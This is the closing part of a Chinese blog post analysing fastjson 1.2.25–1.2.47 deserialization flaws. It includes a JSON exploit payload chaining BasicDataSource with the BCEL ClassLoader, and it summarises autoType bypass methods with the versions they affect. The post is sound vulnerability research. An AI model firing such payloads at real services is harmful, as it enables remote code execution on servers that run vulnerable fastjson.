+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  [&#123;&quot;@type&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;:&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;&#125;, &#123;&quot;@type&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;]:&#123;</span><br><span class="line">     &quot;x&quot;:&#123;</span><br><span class="line">             &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,                </span><br><span class="line">         &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">                 &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;               </span><br><span class="line">                     &#125;,</span><br><span class="line">             &quot;driverClassName&quot;: &quot;BCELPayload&quot; &#125;</span><br><span class="line"> &#125;: &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>调试发现<code>org.apache.tomcat.dbcp.dbcp.BasicDataSource</code>是可以加载的，但是<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>由于是字段值，将通过<code>JavaBeanDeserializer</code>去反序列化处理，而在该类中，<code>checkAutoType</code>是传入的<code>expectClass</code></p>
+<div align=center><img src="/img/fastjson 1.2.25-1.2.47漏洞分析/12.png" alt="12" style="zoom:50%;" /></div>
+
+<p>因此在<code>checkAutoType</code>方法中，会先进入对类名的黑名单判断，导致<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>匹配黑名单报错<br>!</p>
+<div align=center><img src="/img/fastjson 1.2.25-1.2.47漏洞分析/13.png" alt="13" style="zoom:50%;" /></div>
+
+<p>那如果将<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>构造成<code>Lcom.sun.org.apache.bcel.internal.util.ClassLoader;</code>呢，这样黑名单是可以过去的，但是下面有专门针对<code>ClassLoader</code>和<code>DataSource</code>类型进行判断，并抛出异常</p>
+<div align=center><img src="/img/fastjson 1.2.25-1.2.47漏洞分析/14.png" alt="14" style="zoom:50%;" /></div>
+
+<p><strong>所以暂时BCEL只能在1.2.24中使用</strong></p>
+<h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h2><p>通过测试+对比代码</p>
+<ul>
+<li>手动开启<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code> ，结合<code>L+类名+;</code>绕过的方式，适用版本 <code>1.2.25-1.2.41</code>，但是这取决于目标环境是否手动开启了<code>AutoTypeSupport</code></li>
+<li>通过<code>java.lang.Class</code>绕过<code>autoTypeSupport</code>，适用版本 <code>&lt;=1.2.47</code><h3 id="2-1-1-2-42的修复"><a href="#2-1-1-2-42的修复" class="headerlink" title="2.1 1.2.42的修复"></a>2.1 1.2.42的修复</h3>修改fastjson为1.2.42，调试进入<code>checkAutoType</code>方法，可以看到，这里先对<code>Lxxxx;</code>进行过滤，再进行黑名单的判断</li>
+</ul>
+<div align=center><img src="/img/fastjson 1.2.25-1.2.47漏洞分析/15.png" alt="15" style="zoom:50%;" /></div>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/link">链接</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BF%AE%E5%A4%8D%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">1. 修复分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-checkAutoType%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 checkAutoType方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-autoTypeSupport"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 autoTypeSupport</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%B8%8D%E5%BC%80%E5%90%AFautoTypeSupport%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">2. 不开启autoTypeSupport的绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E5%86%85%E7%BD%AE%E7%9A%84Class%E7%B1%BB"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 内置的Class类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-Class%E7%B1%BB%E9%80%9A%E8%BF%87TypeUtils-loadClass%E5%8A%A0%E8%BD%BD%E7%B1%BB"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 Class类通过TypeUtils.loadClass加载类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-Poc"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 Poc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-1-JdbcRowSetImpl%E7%9A%84%E4%B8%A4%E4%B8%AA%E5%86%99%E6%B3%95"><span class="toc-number">2.3.1.</span> <span class="toc-text">2.3.1 JdbcRowSetImpl的两个写法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-2-BCEL%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.3.2.</span> <span class="toc-text">2.3.2 BCEL利用链</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">3. 总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-1-2-42%E7%9A%84%E4%BF%AE%E5%A4%8D"><span class="toc-number">3.1.</span> <span class="toc-text">2.1 1.2.42的修复</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.25-1.2.47%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.25-1.2.47%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=fastjson 1.2.25-1.2.47漏洞分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.25-1.2.47%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.25-1.2.47漏洞分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.25-1.2.47%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=fastjson 1.2.25-1.2.47漏洞分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=fastjson 1.2.25-1.2.47漏洞分析&body=Check out this article: http://blog.ninefiger.top/2022/11/11/fastjson%201.2.25-1.2.47%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.25-1.2.47%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.25-1.2.47漏洞分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.25-1.2.47%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.25-1.2.47漏洞分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.25-1.2.47%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.25-1.2.47漏洞分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.25-1.2.47%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.25-1.2.47漏洞分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.25-1.2.47%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=fastjson 1.2.25-1.2.47漏洞分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.25-1.2.47%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=fastjson 1.2.25-1.2.47漏洞分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2017-2022
+    ninefiger
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/link">链接</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
